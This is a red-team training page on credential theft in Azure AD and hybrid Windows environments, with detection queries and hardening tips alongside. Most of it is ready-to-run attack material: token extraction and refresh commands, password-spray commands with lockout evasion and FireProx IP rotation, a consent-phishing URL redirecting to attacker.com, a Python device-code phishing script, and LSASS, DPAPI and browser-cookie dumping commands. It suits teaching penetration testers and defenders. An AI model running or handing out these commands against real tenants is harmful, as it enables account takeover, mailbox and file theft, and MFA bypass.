---
layout: training-page
title: "Azure Credential Access — Red Team Academy"
module: "Active Directory"
tags:
  - azure-ad
  - credential-access
  - token-theft
  - password-spray
  - device-code-flow
  - consent-grant
  - lsass
  - dpapi
page_key: "ad-azure-credential-access"
render_with_liquid: false
---

# Azure Credential Access

Azure credential access techniques target OAuth tokens, session cookies, cached credentials, and identity flows specific to Microsoft cloud environments. Unlike on-prem attacks that target NTLM hashes or Kerberos tickets, cloud attacks focus on bearer tokens, refresh tokens, and OAuth consent abuse — often bypassing MFA entirely by stealing the token post-authentication.

## Access Tokens and Refresh Tokens

Azure AD issues short-lived **access tokens** (1 hour) and long-lived **refresh tokens** (90 days with `offline_access` scope). Refresh tokens enable persistent access — stealing one is equivalent to long-term account compromise.

### Token Storage Locations

| Location | Contents |
|----------|----------|
| `~/.azure/azureProfile.json` | Azure CLI subscription info |
| `~/.azure/msal_token_cache.json` | Cached MSAL tokens (Linux/macOS) |
| `%APPDATA%\Microsoft\TokenBroker\` | Windows token broker cache |
| `%LOCALAPPDATA%\.IdentityService\` | VS Code / Dev tools token cache |
| LSASS memory (hybrid-joined machines) | Azure AD tokens in WAM broker |
| Browser local storage / cookies | Graph API session tokens |

### Extracting Tokens with AADInternals

```
# Export all cached Azure AD tokens
Import-Module .\AADInternals.ps1
Get-AADIntCache

# Get an access token for Microsoft Graph
Get-AADIntAccessTokenForMSGraph

# Use a captured refresh token to get new access tokens
Get-AADIntAccessTokenForAzureCoreManagement -RefreshToken "<refresh_token>"
```

### TokenTactics — Token Manipulation

```
# Clone repo and import
git clone https://github.com/f-bader/TokenTacticsV2
Import-Module .\TokenTactics.ps1

# Refresh an access token
Invoke-RefreshToToken -Domain "victim.onmicrosoft.com" -refreshToken "<token>"

# Get token for Outlook/Exchange
Invoke-RefreshToOutlookToken -Domain "victim.onmicrosoft.com" -refreshToken "<token>"
```

### Revoking Compromised Refresh Tokens (Blue Team)

```powershell
# Revoke all refresh tokens for a user
Revoke-AzureADUserAllRefreshToken -ObjectId "<user-object-id>"

# Via Microsoft Graph
POST https://graph.microsoft.com/v1.0/users/<userId>/revokeSignInSessions
```

---

## Password Spraying Azure AD

Password spraying targets Azure AD authentication endpoints with common passwords across many accounts — exploiting the fact that Azure Smart Lockout locks individual accounts (not source IPs) after too many failures.

### Smart Lockout Behavior

- Default lockout threshold: **10 failed attempts**
- Default lockout duration: **60 seconds** (increases exponentially)
- Lockout applies **per account**, not per IP → spray slowly across many accounts

### SprayAzure

```
# Clone and install
git clone https://github.com/dafthack/MSOLSpray
Import-Module .\MSOLSpray.ps1

# Spray a list of usernames with one password
Invoke-MSOLSpray -UserList .\userlist.txt -Password "Winter2024!" -OutFile valid_creds.txt

# Delay between attempts (evade threshold)
Invoke-MSOLSpray -UserList .\userlist.txt -Password "Password123" -Delay 60
```

### o365spray — User Enumeration + Spray

```
pip install o365spray

# Validate the tenant (confirm o365 presence)
python3 o365spray.py --validate --domain victim.com

# Enumerate valid users via authentication timing
python3 o365spray.py --enum -U userlist.txt --domain victim.com

# Spray enumerated users
python3 o365spray.py --spray -U valid_users.txt -P passwords.txt --domain victim.com --count 2 --lockout 5
```

### FireProx — IP Rotation to Evade Lockout

FireProx proxies requests through AWS API Gateway, rotating source IPs per request — defeating IP-based rate limiting.

```
# Install FireProx
git clone https://github.com/ustayready/fireprox
pip install -r requirements.txt

# Create proxy for Azure login endpoint
python3 fire.py --access_key <AWS_KEY> --secret_access_key <AWS_SECRET> \
    --region us-east-1 --url https://login.microsoft.com

# Use the returned proxy URL with MSOLSpray
Invoke-MSOLSpray -UserList users.txt -Password "Password1" \
    -URL https://<id>.execute-api.us-east-1.amazonaws.com/fireprox
```

### Detection — KQL (Sentinel / Log Analytics)

```
// Detect multiple failed sign-ins (ResultType 50053 = smart lockout)
SigninLogs
| where ResultType == 50053
| summarize FailCount = count() by UserPrincipalName, IPAddress, bin(TimeGenerated, 1h)
| where FailCount > 5
| order by FailCount desc

// Detect successful login after multiple failures (spray success indicator)
SigninLogs
| where ResultType == 0
| join kind=inner (
    SigninLogs | where ResultType == 50126  // invalid password
    | summarize FailCount = count() by UserPrincipalName
    | where FailCount > 5
) on UserPrincipalName
```

---

## Illicit Consent Grant Attacks

OAuth consent phishing tricks users into granting a malicious Azure AD app access to their data — without ever capturing credentials. The attack exploits legitimate Microsoft consent flows.

### Attack Flow

1. Register a malicious app in Azure AD (any tenant)
2. Craft an OAuth authorization URL requesting dangerous permissions
3. Phish the victim to click the URL and approve the app
4. Receive an authorization code → exchange for access + refresh tokens
5. Use tokens to access victim's mailbox, files, directory data indefinitely

### Constructing the Malicious Consent URL

```
https://login.microsoftonline.com/<tenant_id>/oauth2/authorize?
  client_id=<malicious_app_client_id>
  &response_type=code
  &redirect_uri=https://attacker.com/callback
  &scope=Mail.Read+Files.ReadWrite.All+User.ReadBasicAll+offline_access
  &prompt=consent
```

The `prompt=consent` parameter forces the consent dialog to appear even if the user previously granted the app.

### Dangerous Scopes to Request

| Scope | Access Granted |
|-------|---------------|
| `Mail.Read` / `Mail.ReadWrite` | Read or modify all user email |
| `Files.ReadWrite.All` | Full OneDrive access |
| `User.ReadWrite.All` | Read and modify all users in tenant |
| `Directory.Read.All` | Read entire directory |
| `offline_access` | Refresh tokens for persistent access |
| `Calendars.ReadWrite` | Read and modify all calendars |
| `Chat.Read` | Read all Teams messages |

### AADInternals — Invoke Consent Phishing

```
Import-Module .\AADInternals.ps1

# Start an OAuth phishing flow for the victim tenant
Invoke-AADIntConsentPhishing -ClientId "<malicious_app_id>" `
    -TenantId "<victim_tenant_id>" `
    -Scope "Mail.Read Files.ReadWrite.All offline_access"
```

### Post-Consent Graph API Exploitation

```bash
# After receiving the access token, access victim resources
# Read inbox
curl -H "Authorization: Bearer <access_token>" \
     https://graph.microsoft.com/v1.0/me/messages

# List files in OneDrive
curl -H "Authorization: Bearer <access_token>" \
     https://graph.microsoft.com/v1.0/me/drive/root/children

# List all users in tenant
curl -H "Authorization: Bearer <access_token>" \
     https://graph.microsoft.com/v1.0/users
```

### Blue Team — Detection and Prevention

```
// Sentinel: Detect new app consent grants
AuditLogs
| where OperationName == "Consent to application"
| where TargetResources[0].displayName != ""
| project TimeGenerated, InitiatedBy.user.userPrincipalName, 
          TargetResources[0].displayName, Result
| where Result == "success"
```

**Preventive controls:**
- Enable **Admin Consent Workflow** — require admin approval for all app consents
- Block end-user consent for apps from unverified publishers
- Use **App Governance** in Defender for Cloud Apps to monitor consent patterns
- Set Conditional Access policies to restrict device code and OAuth flows

---

## Device Code Flow Phishing

The OAuth Device Code flow is designed for input-limited devices (CLI tools, smart TVs) but can be weaponized to harvest tokens via phishing without capturing passwords.

### How the Attack Works

1. Attacker initiates a device code request for a malicious (or legitimate-looking) app
2. Microsoft returns a device code and verification URL (`https://microsoft.com/devicelogin`)
3. Attacker sends phishing message: "Enter code ABCD-1234 at microsoft.com/devicelogin to verify your VPN access"
4. Victim authenticates legitimately at Microsoft's real domain
5. Attacker's polling loop receives the access token + refresh token

The attack is effective because the victim visits a **real Microsoft URL** — no spoofed pages needed.

### AADInternals — Device Code Phishing

```
Import-Module .\AADInternals.ps1

# Start device code flow — attacker gets the code and URL
Start-AADIntDeviceCodeFlow

# Output:
# To sign in, use a web browser to open the page https://microsoft.com/devicelogin
# and enter the code ABCD-1234

# Once victim completes authentication, tokens are captured automatically
# Access token: eyJ0eXAiOiJKV1QiLCJhbGci...
# Refresh token: 0.AAAA...
```

### Python Script Variant

```python
import msal, time

app = msal.PublicClientApplication(
    client_id="<malicious_app_id>",
    authority="https://login.microsoftonline.com/<tenant_id>"
)

flow = app.initiate_device_flow(scopes=["User.Read", "Mail.Read", "offline_access"])
print(flow["message"])  # Print code and URL for phishing

# Poll until victim authenticates
while True:
    result = app.acquire_token_by_device_flow(flow)
    if "access_token" in result:
        print(f"Access token: {result['access_token']}")
        print(f"Refresh token: {result.get('refresh_token', 'N/A')}")
        break
    time.sleep(5)
```

### Detection

```
// SigninLogs: Detect non-browser client type (Device Code indicator)
SigninLogs
| where ClientAppUsed == "Mobile Apps and Desktop clients"
| where AuthenticationProtocol == "deviceCode"
| project TimeGenerated, UserPrincipalName, AppDisplayName, IPAddress, Location
```

---

## LSASS and DPAPI Dumping (Hybrid Environments)

On hybrid Azure AD-joined machines, LSASS and DPAPI contain cloud authentication material alongside traditional Windows credentials. Dumping these enables cloud lateral movement from on-prem.

### What Cloud Credentials Are In LSASS?

- Azure AD tokens (via Windows Authentication Manager / WAM)
- Cached Azure CLI tokens
- Microsoft app session material (Teams, Outlook)
- Kerberos TGTs for hybrid-joined domains

### LSASS Dumping Methods

```
# Mimikatz — dump logon sessions including Azure material
privilege::debug
sekurlsa::logonpasswords

# ProcDump — memory dump for offline analysis
procdump.exe -ma lsass.exe lsass.dmp

# Parse dump with Mimikatz
mimikatz.exe
sekurlsa::minidump lsass.dmp
sekurlsa::logonpasswords

# comsvcs.dll — LOLBin approach (lower detection rate)
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <lsass_pid> lsass.dmp full
```

### DPAPI — Decrypt Azure CLI and Browser Tokens

DPAPI encrypts user secrets using the user's logon credentials. Compromising NTLM hash or master key enables offline decryption.

```
# Mimikatz — decrypt DPAPI credentials
dpapi::cred /in:"C:\Users\<user>\AppData\Local\Microsoft\Credentials\<file>"

# SharpDPAPI — extract master keys and credentials
SharpDPAPI masterkeys /target:C:\Users\<user>\AppData\Roaming\Microsoft\Protect\<SID>\
SharpDPAPI credentials /target:C:\Users\<user>\AppData\Local\Microsoft\Credentials\

# Azure CLI tokens stored in DPAPI-encrypted format
# Location: C:\Users\<user>\.azure\msal_token_cache.bin (encrypted)
# After DPAPI decryption → JSON with access + refresh tokens
```

### Azure-Relevant DPAPI Targets

| Path | Contents |
|------|----------|
| `~/.azure/msal_token_cache.bin` | Azure CLI MSAL token cache |
| `%APPDATA%\Microsoft\Teams\` | Teams session tokens |
| Chrome / Edge LocalStorage | Graph API session tokens |
| `%LOCALAPPDATA%\.IdentityService\` | VS Code / MSAL tokens |

### Hardening

```powershell
# Enable Credential Guard (isolates LSASS in secure enclave)
# Set via Group Policy: Computer Configuration > Administrative Templates >
# System > Device Guard > Turn on Virtualization Based Security

# Disable WDigest (prevents cleartext passwords in LSASS)
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest `
    /v UseLogonCredential /t REG_DWORD /d 0 /f

# Enable RunAsPPL to protect LSASS as protected process
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 1 /f
```

---

## Browser Credential and Cookie Theft

Browser-stored credentials and session cookies provide direct access to Azure portals, Graph API, and SaaS applications.

```
# SharpChrome — extract Chrome saved passwords and cookies
SharpChrome.exe logins
SharpChrome.exe cookies --url "https://portal.azure.com"

# Edge tokens via SharpEdge
SharpEdge.exe logins

# Manual: Copy browser profile for offline decryption
copy "C:\Users\<user>\AppData\Local\Google\Chrome\User Data\Default\Login Data" .
copy "C:\Users\<user>\AppData\Local\Google\Chrome\User Data\Default\Cookies" .
```

Captured session cookies from `portal.azure.com` or `login.microsoftonline.com` can be replayed in a browser via developer tools to hijack authenticated sessions without MFA.

---

## Red vs Blue Summary

| Technique | Detection | Hardening |
|-----------|-----------|-----------|
| Token theft from disk | Monitor `~/.azure/` access | Short token lifetimes + CAE |
| Password spraying | KQL: multiple ResultType 50126 | Named locations + MFA required |
| Consent grant phishing | AuditLogs: "Consent to application" | Admin Consent Workflow |
| Device code phishing | SigninLogs: AuthenticationProtocol==deviceCode | Block Device Code with CA policy |
| LSASS dumping | Sysmon Event 10 (lsass access) | Credential Guard, PPL |
| DPAPI decryption | File access to Credentials folder | TPM-bound DPAPI keys |
| Browser cookie theft | EDR process access to Chrome/Edge | Full-disk encryption, short sessions |

## Resources

- AADInternals — `github.com/Gerenios/AADInternals`
- TokenTacticsV2 — `github.com/f-bader/TokenTacticsV2`
- MSOLSpray — `github.com/dafthack/MSOLSpray`
- o365spray — `github.com/0xZDH/o365spray`
- FireProx — `github.com/ustayready/fireprox`
- SharpDPAPI — `github.com/GhostPack/SharpDPAPI`
- Microsoft Conditional Access docs — `learn.microsoft.com/en-us/entra/identity/conditional-access/`
